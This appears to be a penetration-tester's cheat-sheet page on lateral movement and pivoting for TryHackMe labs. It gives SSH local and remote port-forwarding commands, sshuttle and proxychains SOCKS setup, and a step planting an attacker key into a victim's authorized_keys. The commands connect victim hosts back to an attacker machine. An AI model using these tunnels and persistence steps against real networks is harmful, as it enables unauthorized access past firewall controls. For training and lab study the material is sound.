# Lateral Movement and Pivoting

## SSH Proxy Chaining

### SSH Local Port Forwarding

**Examples**

[game-zone.md](../../walkthroughs/tryhackme/game-zone.md "mention")[internal.md](../../walkthroughs/tryhackme/internal.md "mention")

**Local port forwarding** allows us to "pull" a port from an SSH server into the SSH client. In our scenario, this could be used to take any service available in our attacker's machine and make it available through a port on PC-1. That way, any host that can't connect directly to the attacker's PC but can connect to PC-1 will now be able to reach the attacker's services through the pivot host.

Using this type of port forwarding would allow us to run reverse shells from hosts that normally wouldn't be able to connect back to us or simply make any service we want available to machines that have no direct connection to us.

<figure><img src="../../.gitbook/assets/image (100) (1).png" alt=""><figcaption></figcaption></figure>

Allows us to gain access to the service running on port 10000 from Kali that was only accessible to the victim from their machine.

**Kali**

```
ssh -L 10000:localhost:10000 $USERNAME@$VICTIM
Password: $ASSWORD
```

### SSH Remote Port Forwarding

**Examples**

&#x20;[#ssh-remote-port-forwarding](../../walkthroughs/tryhackme/lateral-movement-and-pivoting.md#ssh-remote-port-forwarding "mention")

In our example, let's assume that firewall policies block the attacker's machine from directly accessing port 3389 on the server. If the attacker has previously compromised PC-1 and, in turn, PC-1 has access to port 3389 of the server, it can be used to pivot to port 3389 using remote port forwarding from PC-1. **Remote port forwarding** allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a **remote** SSH server (the attacker's machine).

As a result, a port will be opened in the attacker's machine that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:

<figure><img src="../../.gitbook/assets/image (110) (1).png" alt=""><figcaption></figcaption></figure>

Referring to the previous image, to forward port 3389 on the server back to our attacker's machine, we can use the following command on PC-1:

<figure><img src="../../.gitbook/assets/image (112) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
useradd tunneluser
passwd tunneluser
```

**Victim**

```
ssh tunneluser@$KALI -R 8888:thmdc.za.tryhackme.com:80 -L *:1990:127.0.0.1:1990 -L *:1029:127.0.0.1:1029 -N
```



## sshuttle

**Examples**

[internal.md](../../walkthroughs/tryhackme/internal.md "mention")

**Kali**

```
apt install sshuttle
sshuttle -r $USERNAME@$VICTIM 127.0.0.1/24
Password: $PASSWORD
```

### SSH

**Examples**

[chill-hack.md](../../walkthroughs/tryhackme/chill-hack.md "mention")

**Kali**

```
ssh-keygen -t rsa
cat /root/.ssh/id_rsa.pub
```

**Victim**

copy paste id\_rsa.pub from Kali to the Victim server

```
copy id_rsa.pub to /home/$VICTIM/.ssh/authorized_keys
```

**Kali**

```
vi /etc/proxychains.conf
```

**proxychains.conf**

```
socks4 	127.0.0.1 9050
```

**Kali**

```
ssh -D 9050 $USERNAME@VICTIM
```

<figure><img src="../../.gitbook/assets/image (42) (2).png" alt=""><figcaption></figcaption></figure>



I can now see the webpage from Kali but no login credentials to use.

<figure><img src="../../.gitbook/assets/image (40) (4).png" alt=""><figcaption></figcaption></figure>

Found



